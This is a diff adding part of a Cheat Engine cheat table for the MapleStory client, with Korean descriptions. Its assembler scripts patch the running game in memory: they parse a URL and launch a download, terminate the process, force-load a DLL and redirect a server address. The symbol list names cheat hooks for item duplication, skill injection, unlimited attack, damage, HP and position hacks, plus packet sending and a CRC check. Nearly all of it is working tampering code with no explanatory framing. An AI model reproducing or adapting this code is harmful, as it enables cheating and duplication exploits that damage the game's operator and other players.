+      <LastState/>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+//code from here to '[DISABLE]' will be used to enable the cheat
+
+label(download)
+label(goto1)
+label(goto2)
+
+01522D00:
+db B3 CA B9 AB 20 BF C0 B7 A1 20 B5 C8 20 B9 F6 C0 FC C0 D4 B4 CF B4 D9 2E 00 9E 85 EB 8B 88 EB 8B A4 2E
+01522D00+70:
+db C8 AE C0 CE C0 BB 20 B4 A9 B8 A3 B8 E9 20 BB F5 B9 F6 C0 FC 20 B4 D9 BF EE B7 CE B5 E5 20 B8 B5 C5 A9 B7 CE 20 B5 E9 BE EE B0 A1 20 C1 FD B4 CF B4 D9 2E 00 20 EB 93 A4 EC 96 B4 EA B0 80 20 EC A7 91 EB 8B 88 EB 8B A4 2E
+
+01961000:
+mov eax,[019E0FEE]
+mov eax,[eax+8]
+add eax,1
+push eax
+push MapleStory.exe+7B0F4F //%d
+push 00000003
+push 01521000
+call apiX7F
+push 018D1245+1
+push MapleStory.exe+7B0F4F //%d
+push 00000003
+push 01521008
+call apiX7F
+mov eax,[019E0FEE]
+mov eax,[eax+8]
+goto1:
+inc eax
+cmp [eax],'URL='
+jne goto1
+add eax,4
+mov [01520D00],eax
+goto2:
+inc eax
+cmp [eax],'&lt;&lt;&lt;&lt;'
+jne goto2
+mov [eax],0 //exit
+mov eax,[01521000]
+cmp [01521008],eax
+jbe download
+mov eax,[highter]
+mov [esp],eax//kernel32.BaseThreadInitThunk+12
+ret
+
+download:
+push 0
+push 01522D00
+push 01522D00+70
+push 0
+call [boxa]
+
+PUSH 5
+PUSH 0
+PUSH 0
+PUSH [01520D00]
+PUSH 0
+PUSH 0
+call [0150501C]
+mov eax,[highter]
+mov [esp],eax//kernel32.BaseThreadInitThunk+12
+ret
+createThread(01961000)
+ 
+ 
+[DISABLE]
+//code from here till the end of the code will be used to disable the cheat
+</AssemblerScript>
+      <CheatEntries>
+        <CheatEntry>
+          <ID>821</ID>
+          <Description>"오래된 다운로드 완료 메세지박스"</Description>
+          <LastState/>
+          <VariableType>Auto Assembler Script</VariableType>
+          <AssemblerScript>[ENABLE]
+//code from here to '[DISABLE]' will be used to enable the cheat
+
+015061C0:
+db B4 D9 BF EE B7 CE B5 E5 B0 A1 20 BF CF B7 E1 20 B5 C7 BE FA BD C0 B4 CF B4 D9 2E 00 00 00
+
+01506220:
+db C8 AE C0 CE C0 BB 20 B4 A9 B8 A3 B8 E9 20 C1 BE B7 E1 20 B5 CB B4 CF B4 D9 2E 0D 0A B0 D4 C0 D3 C0 BB 20 C0 E7 C1 A2 BC D3 20 C7 D8 C1 D6 BC BC BF E4 2E 00 00
+0190105E:
+push 0
+push 01506220 //제목
+push 01506220
+push 0
+call [boxa]
+push 0
+push fffffffe
+call [MapleStory.exe+71012C] //kernel32.TerminateProcess
+ret
+ 
+ 
+[DISABLE]
+//code from here till the end of the code will be used to disable the cheat
+</AssemblerScript>
+        </CheatEntry>
+      </CheatEntries>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>795</ID>
+      <Description>"ijl15.dll get"</Description>
+      <LastState/>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+//code from here to '[DISABLE]' will be used to enable the cheat
+
+01A00C40:
+db 'ijl15.dll' 00
+
+01C84300: //ijl15.dll get
+push #9000
+call [sleepde2]
+push 01A00C40
+call [LoadL]
+mov [01A00C40-30],eax
+ret
+ 
+ 
+[DISABLE]
+//code from here till the end of the code will be used to disable the cheat
+</AssemblerScript>
+      <CheatEntries>
+        <CheatEntry>
+          <ID>873</ID>
+          <Description>"서브 도메인작동하기"</Description>
+          <LastState/>
+          <VariableType>Auto Assembler Script</VariableType>
+          <AssemblerScript>[ENABLE]
+//code from here to '[DISABLE]' will be used to enable the cheat
+
+
+label(returnhere)
+
+
+01C85002:
+mov [00BFEA34],00C84600
+call MapleStory.exe+995DA
+
+jmp returnhere
+
+"MapleStory.exe"+995A9:
+jmp 01C85002
+returnhere:
+
+ 
+ 
+[DISABLE]
+//code from here till the end of the code will be used to disable the cheat
+</AssemblerScript>
+        </CheatEntry>
+      </CheatEntries>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>879</ID>
+      <Description>"crc작동"</Description>
+      <VariableType>4 Bytes</VariableType>
+      <Address>00501000</Address>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>880</ID>
+      <Description>"No description"</Description>
+      <ShowAsHex>1</ShowAsHex>
+      <VariableType>4 Bytes</VariableType>
+      <Address>MapleStory.exe+7FC550+6</Address>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>881</ID>
+      <Description>"No description"</Description>
+      <ShowAsHex>1</ShowAsHex>
+      <VariableType>4 Bytes</VariableType>
+      <Address>break.exe+71008C</Address>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>882</ID>
+      <Description>"No description"</Description>
+      <ShowAsHex>1</ShowAsHex>
+      <VariableType>4 Bytes</VariableType>
+      <Address>break.exe+7FE9F4</Address>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>883</ID>
+      <Description>"No description"</Description>
+      <ShowAsHex>1</ShowAsHex>
+      <VariableType>4 Bytes</VariableType>
+      <Address>aossdk.dll+220F4</Address>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>884</ID>
+      <Description>"No description"</Description>
+      <ShowAsHex>1</ShowAsHex>
+      <VariableType>4 Bytes</VariableType>
+      <Address>mss32.dll+50154</Address>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>885</ID>
+      <Description>"No description"</Description>
+      <VariableType>4 Bytes</VariableType>
+      <Address>00401000</Address>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>886</ID>
+      <Description>"No description"</Description>
+      <ShowAsHex>1</ShowAsHex>
+      <VariableType>4 Bytes</VariableType>
+      <Address>aossdk.dll+220F4</Address>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>887</ID>
+      <Description>"No description"</Description>
+      <ShowAsHex>1</ShowAsHex>
+      <VariableType>4 Bytes</VariableType>
+      <Address>break.exe+710148</Address>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>888</ID>
+      <Description>"No description"</Description>
+      <ShowAsHex>1</ShowAsHex>
+      <VariableType>4 Bytes</VariableType>
+      <Address>break.exe+710148</Address>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>889</ID>
+      <Description>"No description"</Description>
+      <ShowAsHex>1</ShowAsHex>
+      <VariableType>4 Bytes</VariableType>
+      <Address>break.exe+710064</Address>
+    </CheatEntry>
+  </CheatEntries>
+  <UserdefinedSymbols>
+    <SymbolEntry>
+      <Name>MainAddressHook2</Name>
+      <Address>12311AB0</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>MainAddr2</Name>
+      <Address>12311B30</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>MainAddress_2</Name>
+      <Address>12311BB0</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>hook</Name>
+      <Address>12311C30</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>stance</Name>
+      <Address>12311E30</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>MobTrans</Name>
+      <Address>12312230</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>StanceSwitch</Name>
+      <Address>12312630</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>TransSwitch</Name>
+      <Address>12312640</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>MultiKillSwitch</Name>
+      <Address>12312650</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>DmageSwitch</Name>
+      <Address>12312660</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>EnableHook2</Name>
+      <Address>123126F0</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>DisableHook2</Name>
+      <Address>0ADF1C30</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>SSDupeHook</Name>
+      <Address>0DA90000</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>SSDupe</Name>
+      <Address>0DA90080</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>SSDupe2</Name>
+      <Address>0DA90480</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>SSDupe3</Name>
+      <Address>0DA90880</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>SSDupeFucn</Name>
+      <Address>0DA90C80</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>DupeSwitch</Name>
+      <Address>0DA91080</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>MotionBase</Name>
+      <Address>12311090</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>Motion7_1</Name>
+      <Address>12311110</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>Motion7Thread</Name>
+      <Address>12311190</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>Motion7_Call</Name>
+      <Address>12311210</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>MainAddressHook</Name>
+      <Address>12311290</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>MainAddr</Name>
+      <Address>12311310</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>MainAddress_</Name>
+      <Address>12311390</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>HPHook</Name>
+      <Address>12311410</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>HP</Name>
+      <Address>12311610</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>Motion</Name>
+      <Address>12311A10</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>HPSwitch</Name>
+      <Address>12311A90</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>DieSwitch</Name>
+      <Address>12311AA0</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>EnableHook</Name>
+      <Address>12312670</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>DisableHook</Name>
+      <Address>0ADF1B30</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>SkillHook</Name>
+      <Address>0DA91090</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>SkillHook2</Name>
+      <Address>0DA91110</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>SkillInjection_1</Name>
+      <Address>0DA91190</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>SkillInjection_2</Name>
+      <Address>0DA91590</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>SkillCode</Name>
+      <Address>10390200</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>UnlimitedAttack</Name>
+      <Address>0CC90080</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>UnlimitedSwitch</Name>
+      <Address>0CC90100</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>SendPacket</Name>
+      <Address>0FFE3120</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>Send_Fucn</Name>
+      <Address>0FFE3320</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>NDFA</Name>
+      <Address>10993520</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>dupe</Name>
+      <Address>105E0000</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>s1</Name>
+      <Address>105E0070</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>Skill</Name>
+      <Address>10390000</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>s2</Name>
+      <Address>10390220</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>VehHook</Name>
+      <Address>103902B0</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>HackPosition</Name>
+      <Address>02790000</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>Position</Name>
+      <Address>02790070</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>randomvalue</Name>
+      <Address>00E90000</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>url</Name>
+      <Address>04DC0000</Address>
+    </SymbolEntry>
+    <SymbolEntry>
+      <Name>Alarm</Name>
+      <Address>04DC0100</Address>
+    </SymbolEntry>
+  </UserdefinedSymbols>
+  <DisassemblerComments>
+    <DisassemblerComment>
+      <Address>"ConsoleApplication11.exe"+117F0</Address>
+      <Comment>fffff1
+</Comment>
+    </DisassemblerComment>
+  </DisassemblerComments>
+</CheatTable>
